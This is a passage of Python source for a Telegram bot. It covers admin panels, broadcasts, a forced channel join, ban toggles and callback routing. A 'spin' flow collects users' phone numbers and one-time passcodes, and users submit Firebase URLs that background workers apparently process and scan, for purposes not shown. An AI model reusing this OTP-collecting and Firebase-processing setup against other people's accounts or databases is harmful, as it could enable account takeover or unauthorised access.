        bot.answer_callback_query(call.id, "✅ Deleted!", show_alert=True)
        send_admin_firebases(chat_id, message_id, page=0, edit=True)
    else:
        bot.answer_callback_query(call.id, "❌ Delete failed.", show_alert=True)


def send_admin_user_firebases(chat_id, message_id, target_id):
    """List the Firebase URLs of one specific user (admin view, marks the selected)."""
    rows = get_user_firebases(target_id)
    selected = get_selected_firebase(target_id)
    selected_id = selected["id"] if selected else None
    if not rows:
        body = (f"📁 <b>FIREBASE</b> for user <code>{target_id}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"❌ No Firebase URLs added.\n"
                f"🔒 Selected panel: {'<code>' + escape(selected['firebase_url']) + '</code>' if selected else 'None'}\n"
                f"{FOOTER}")
    else:
        lines = []
        for r in rows:
            marker = "🔒" if r["id"] == selected_id else "•"
            lines.append(
                f"{marker} {_STATUS_EMOJI.get(r['status'], '⏳')} <code>{escape(r['firebase_url'])}</code>\n"
                f"   🆔 {r['id']} | 📅 {r['added_at']}\n"
                f"   {escape(r['summary'] or '—')}"
            )
        sel_note = (
            f"🔒 Selected panel: <code>{escape(selected['firebase_url'])}</code>\n"
            if selected else "🔒 Selected panel: None\n"
        )
        body = (
            f"📁 <b>FIREBASE</b> for user <code>{target_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            + "\n".join(lines) +
            f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{sel_note}"
            f"ℹ️ Users can delete their own panel in 📂 MY FIREBASE.\n"
            f"{FOOTER}"
        )
    kb = back_markup(f"admin_view_user_{target_id}")
    safe_edit(chat_id, message_id, body, kb)


def broadcast_to_all(text):
    """Send a message to every user in a background thread."""
    user_ids = get_all_user_ids()
    ok = fail = 0
    for uid in user_ids:
        try:
            bot.send_message(uid, text, parse_mode="HTML")
            ok += 1
        except Exception:
            try:
                bot.send_message(uid, text)  # plain fallback (bad HTML etc.)
                ok += 1
            except Exception:
                fail += 1
        time.sleep(0.05)  # avoid hitting Telegram rate limits
    logger.info("Broadcast done: %d delivered, %d failed", ok, fail)
    try:
        bot.send_message(
            ADMIN_ID,
            f"📢 <b>BROADCAST FINISHED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Delivered: <b>{ok}</b>\n"
            f"❌ Failed: <b>{fail}</b>\n"
            f"👥 Total targets: <b>{len(user_ids)}</b>\n"
            f"{FOOTER}",
        )
    except Exception as e:
        logger.error("Broadcast summary send failed: %s", e)


# ════════════════════════════════════════════════════════════════════════════
# 13. COMMAND HANDLERS
# ════════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=["start"])
def cmd_start(message):
    user_id = message.from_user.id
    username = message.from_user.username or ""
    first_name = message.from_user.first_name or "User"

    if not get_user(user_id):
        create_user(user_id, username, first_name)

    user = get_user(user_id)
    if not user:
        return

    if user.get("banned"):
        bot.send_message(user_id,
                         f"⛔ <b>You are banned</b> from this bot.\n"
                         f"{FOOTER}")
        return

    if not check_channel_membership(user_id):
        send_join_required(user_id)
        return

    show_main_menu(user_id, edit=False)


@bot.message_handler(commands=["admin"])
def cmd_admin(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if user_id != ADMIN_ID and not (user and user.get("is_admin")):
        bot.reply_to(message, "❌ Access denied. You are not an admin.")
        return
    send_admin_menu(user_id, edit=False)


@bot.message_handler(commands=["cancel"])
def cmd_cancel(message):
    user_id = message.from_user.id
    clear_state(user_id)
    bot.reply_to(message,
                 f"❌ Action cancelled.\n"
                 f"Use the menu buttons to continue.\n"
                 f"{FOOTER}")


@bot.message_handler(func=lambda m: True, content_types=["text"])
def handle_text(message):
    """Route plain text: spin flow -> firebase flow -> admin flows -> fallback."""
    user_id = message.from_user.id
    text = (message.text or "").strip()

    if text.startswith("/"):
        return  # unknown command, ignore

    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "Press /start to begin.")
        return
    if user.get("banned"):
        bot.reply_to(message, "⛔ You are banned from this bot.")
        return

    # ---- 1. Active spin flow ----
    with _state_lock:
        spin_state = spin_sessions.get(user_id)
    if spin_state:
        step = spin_state.get("step")
        if step == "phone":
            handle_spin_phone(user_id, text)
            return
        if step == "otp":
            handle_spin_otp(user_id, text)
            return

    # ---- 2. Add Firebase flow (URL entry) ----
    with _state_lock:
        fb_state = firebase_states.get(user_id)
    if fb_state and fb_state.get("step") == "awaiting_url":
        handle_add_firebase_text(user_id, text)
        return

    # ---- 3. Admin flows ----
    if is_admin(user):
        with _state_lock:
            admin_state = admin_states.get(user_id)
        if admin_state:
            kind = admin_state.get("type")

            if kind == "broadcast":
                with _state_lock:
                    admin_states.pop(user_id, None)
                    broadcast_msgs[user_id] = text
                preview = text[:300] + ("..." if len(text) > 300 else "")
                total = len(get_all_user_ids())
                kb = InlineKeyboardMarkup(row_width=2)
                kb.row(btn("✅ SEND", callback_data="admin_broadcast_confirm"))
                kb.row(btn("❌ CANCEL", callback_data="admin_broadcast_cancel"))
                bot.send_message(
                    user_id,
                    f"📢 <b>BROADCAST CONFIRMATION</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👥 Will be sent to: <b>{total}</b> users\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{escape(preview)}\n"
                    f"{FOOTER}",
                    reply_markup=kb,
                )
                return

    # ---- 4. Fallback ----
    bot.reply_to(message,
                 f"❓ Please use the menu buttons below.\n"
                 f"Press /start to open the main menu.\n"
                 f"{FOOTER}")


# ════════════════════════════════════════════════════════════════════════════
# 14. CALLBACK QUERY HANDLER (all buttons)
# ════════════════════════════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data or ""
    chat_id = call.message.chat.id if call.message else user_id
    message_id = call.message.message_id if call.message else None
    user = get_user(user_id)

    if not user:
        bot.answer_callback_query(call.id, "Please press /start first.")
        return
    if user.get("banned"):
        bot.answer_callback_query(call.id, "⛔ You are banned from this bot.", show_alert=True)
        return

    # ─────────── FORCE CHANNEL CHECK ───────────
    if data == "check_channel":
        if check_channel_membership(user_id):
            bot.answer_callback_query(call.id, "✅ Channel joined! Welcome!")
            show_main_menu(chat_id, message_id, edit=True)
        else:
            bot.answer_callback_query(call.id,
                                      "❌ You have not joined the channel yet. "
                                      "Tap JOIN first!", show_alert=True)
        return

    # ─────────── USER MENUS ───────────
    if data == "main_menu":
        show_main_menu(chat_id, message_id, edit=True)
        bot.answer_callback_query(call.id)
        return

    if data == "spin_now":
        start_spin(chat_id, message_id)
        bot.answer_callback_query(call.id)
        return

    if data == "my_history":
        send_history(chat_id, message_id, edit=True)
        bot.answer_callback_query(call.id)
        return

    if data == "help":
        send_help(chat_id, message_id, edit=True)
        bot.answer_callback_query(call.id)
        return

    if data == "my_firebase":
        send_my_firebase(chat_id, message_id, page=0, edit=True)
        bot.answer_callback_query(call.id)
        return

    if data == "add_firebase":
        start_add_firebase(chat_id, message_id)
        bot.answer_callback_query(call.id)
        return

    # ─────────── ADD FIREBASE: confirmation (Add This / Add All / Cancel) ───────────
    if data == "fb_add_confirm":
        with _state_lock:
            conf = firebase_confirmations.get(user_id)
        if not conf:
            bot.answer_callback_query(call.id,
                                      "❌ No pending confirmation. Start over with "
                                      "📁 ADD FIREBASE.", show_alert=True)
            return
        confirm_firebase_add(chat_id, message_id)
        bot.answer_callback_query(call.id, "✅ Added! Select a panel to process.",
                                  show_alert=False)
        return

    if data == "fb_add_cancel":
        cancel_firebase_add(user_id)
        bot.answer_callback_query(call.id, "❌ Cancelled - nothing was added.")
        return

    if data.startswith("fb_add_one_"):
        try:
            idx = int(data.rsplit("_", 1)[-1])
        except ValueError:
            return
        confirm_firebase_add_one(chat_id, message_id, idx, call)
        return

    # ─────────── MY FIREBASE: pagination / select / delete ───────────
    if data.startswith("my_fb_page_"):
        try:
            page = int(data.split("_")[-1])
        except ValueError:
            page = 0
        send_my_firebase(chat_id, message_id, page=page, edit=True)
        bot.answer_callback_query(call.id)
        return

    if data.startswith("fb_sel_"):
        try:
            fb_id = int(data.split("_")[-1])
        except ValueError:
            return
        select_firebase(chat_id, message_id, fb_id, call)
        return

    # ─────────── USER: delete own Firebase (with confirmation) ───────────
    if data.startswith("fb_my_del_yes_"):
        try:
            fb_id = int(data.split("_")[-1])
        except ValueError:
            return
        user_delete_firebase(chat_id, message_id, fb_id, call)
        return

    if data.startswith("fb_my_del_"):
        try:
            fb_id = int(data.split("_")[-1])
        except ValueError:
            return
        confirm_user_delete_firebase(chat_id, message_id, fb_id)
        return

    if data == "noop":
        bot.answer_callback_query(call.id, "🔒 Selected panel — delete it to pick another.")
        return

    # ─────────── ADMIN ROUTING ───────────
    if data.startswith("admin"):
        if not is_admin(user):
            bot.answer_callback_query(call.id, "❌ Unauthorized.", show_alert=True)
            return
        handle_admin_callback(call, chat_id, message_id, data)

    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass  # already answered inside an admin path - safe to ignore


def handle_admin_callback(call, chat_id, message_id, data):
    """Route all admin panel button presses."""
    user_id = call.from_user.id

    if data == "admin_panel":
        send_admin_menu(chat_id, message_id, edit=True)
        return

    if data == "admin_stats":
        send_admin_stats(chat_id, message_id, edit=True)
        return

    if data == "admin_analytics":
        send_admin_analytics(chat_id, message_id, edit=True)
        return

    if data == "admin_users":
        send_admin_users(chat_id, message_id, page=0, edit=True)
        return

    if data.startswith("admin_users_page_"):
        try:
            page = int(data.split("_")[-1])
        except ValueError:
            page = 0
        send_admin_users(chat_id, message_id, page=page, edit=True)
        return

    if data.startswith("admin_view_user_"):
        try:
            target = int(data.split("_")[-1])
        except ValueError:
            target = 0
        send_admin_user_detail(chat_id, message_id, target)
        return

    if data.startswith("admin_spins_"):
        try:
            target = int(data.split("_")[-1])
        except ValueError:
            target = 0
        send_admin_user_spins(chat_id, message_id, target)
        return

    # ─────────── Firebase management ───────────
    if data == "admin_firebases":
        send_admin_firebases(chat_id, message_id, page=0, edit=True)
        return

    if data.startswith("admin_fb_page_"):
        try:
            page = int(data.split("_")[-1])
        except ValueError:
            page = 0
        send_admin_firebases(chat_id, message_id, page=page, edit=True)
        return

    if data.startswith("admin_fb_view_"):
        try:
            fb_id = int(data.split("_")[-1])
        except ValueError:
            return
        send_admin_firebase_detail(chat_id, message_id, fb_id)
        return

    if data.startswith("admin_fb_user_"):
        try:
            target = int(data.split("_")[-1])
        except ValueError:
            return
        send_admin_user_firebases(chat_id, message_id, target)
        return

    # ─────────── Admin delete Firebase (with confirmation) ───────────
    if data.startswith("admin_fb_del_yes_"):
        try:
            fb_id = int(data.split("_")[-1])
        except ValueError:
            return
        admin_delete_firebase(chat_id, message_id, fb_id, call)
        return

    if data.startswith("admin_fb_del_"):
        try:
            fb_id = int(data.split("_")[-1])
        except ValueError:
            return
        confirm_admin_delete_firebase(chat_id, message_id, fb_id)
        return

    # ─────────── Ban / unban toggle ───────────
    if data.startswith("admin_ban_"):
        try:
            target = int(data.split("_")[-1])
        except ValueError:
            return
        u = get_user(target)
        if not u:
            bot.answer_callback_query(call.id, "❌ User not found.", show_alert=True)
            return
        new_state = 0 if u.get("banned") else 1
        update_user(target, banned=new_state)
        state_word = "banned" if new_state else "unbanned"
        bot.answer_callback_query(call.id,
                                  f"✅ User {target} {state_word}.",
                                  show_alert=True)
        send_admin_user_detail(chat_id, message_id, target)
        return

    # ─────────── Broadcast ───────────
    if data == "admin_broadcast":
        with _state_lock:
            admin_states[user_id] = {"type": "broadcast"}
        bot.send_message(chat_id,
                         f"📢 Send the <b>message</b> you want to broadcast "
                         f"to all users:\n"
                         f"(supports HTML, /cancel to abort)\n"
                         f"{FOOTER}")
        return

    if data == "admin_broadcast_confirm":
        with _state_lock:
            msg = broadcast_msgs.pop(user_id, None)
            admin_states.pop(user_id, None)
        if not msg:
            bot.answer_callback_query(call.id, "❌ Nothing to send.", show_alert=True)
            return
        safe_edit(chat_id, message_id,
                  "📢 <b>Broadcasting...</b>\n\nThis may take a moment.",
                  None)
        bot.answer_callback_query(call.id, "📢 Broadcasting started!")
        threading.Thread(target=broadcast_to_all, args=(msg,), daemon=True).start()
        return

    if data == "admin_broadcast_cancel":
        with _state_lock:
            broadcast_msgs.pop(user_id, None)
            admin_states.pop(user_id, None)
        bot.answer_callback_query(call.id, "❌ Broadcast cancelled.")
        return


# ════════════════════════════════════════════════════════════════════════════
# 15. SCHEDULED TASKS (background thread)
# ════════════════════════════════════════════════════════════════════════════

def scheduler_loop():
    """Runs every 60s: stale state cleanup."""
    while True:
        time.sleep(60)
        try:
            # Mark panels stuck in 'processing' (e.g. after a restart) as error
            reset_stale_processing(max_age_seconds=7200)
        except Exception as e:
            logger.error("Scheduler stale-processing task failed: %s", e)
        try:
            # Clean stale spin sessions older than 10 minutes
            cutoff = time.time() - 600
            with _state_lock:
                for uid in [u for u in spin_sessions]:
                    if spin_sessions[uid].get("_ts", time.time()) < cutoff:
                        spin_sessions.pop(uid, None)
        except Exception as e:
            logger.error("Scheduler state cleanup failed: %s", e)
        try:
            # Clean stale Firebase confirmations older than 15 minutes
            cutoff = time.time() - 900
            with _state_lock:
                for uid in [u for u in firebase_confirmations]:
                    if firebase_confirmations[uid].get("_ts", time.time()) < cutoff:
                        firebase_confirmations.pop(uid, None)
        except Exception as e:
            logger.error("Scheduler firebase-confirmation cleanup failed: %s", e)


# ════════════════════════════════════════════════════════════════════════════
# 16. MAIN ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════

def main():
    print("=" * 60)
    print(" 🎡 VIEDIET UJALA BOT (UNIFIED)")
    print("    Made by viediet")
    print("=" * 60)

    init_db()

    # Start the bounded background job workers (processing / scans / monitors)
    start_job_workers()

    # Start the background scheduler
    threading.Thread(target=scheduler_loop, daemon=True).start()

    # Start polling (auto-restarts on network errors)
    logger.info("Bot started polling...")
    try:
        bot.infinity_polling(long_polling_timeout=20, skip_pending=True)
    except KeyboardInterrupt:
        print("\n🛑 Interrupted by user. Shutting down gracefully...")
    except Exception as e:
        logger.error("Fatal polling error: %s", e)
    finally:
        try:
            bot.stop_polling()
        except Exception:
            pass
    print("👋 Bot stopped. Goodbye!")


if __name__ == "__main__":
    main()
